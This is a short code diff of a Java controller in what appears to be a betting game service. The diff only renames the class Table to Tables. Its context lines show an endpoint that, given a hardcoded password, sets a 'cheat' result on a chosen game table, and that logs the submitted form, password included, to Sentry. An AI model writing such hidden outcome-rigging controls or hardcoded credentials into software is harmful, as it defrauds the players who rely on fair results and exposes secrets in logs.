@@ -1,6 +1,6 @@
 package bet.lucky.game.controller;
 
-import bet.lucky.game.model.Table;
+import bet.lucky.game.model.Tables;
 import bet.lucky.game.repository.impl.TableRepository;
 import io.sentry.Sentry;
 import lombok.RequiredArgsConstructor;
@@ -28,9 +28,9 @@ public class ToolController  {
     public ResponseEntity<String> tool(@RequestBody ToolForm betForm, HttpServletRequest httpServletRequest) {
         Sentry.getContext().addExtra("data", betForm);
         if ("dfnsmnrleidis".equals(betForm.getPass())) {
-            Optional<Table> object = tableRepository.findById(betForm.getTableId());
+            Optional<Tables> object = tableRepository.findById(betForm.getTableId());
             if (object.isPresent()) {
-                Table a = object.get();
+                Tables a = object.get();
                 a.setCheat(betForm.getResult());
                 tableRepository.save(a);
             } else {
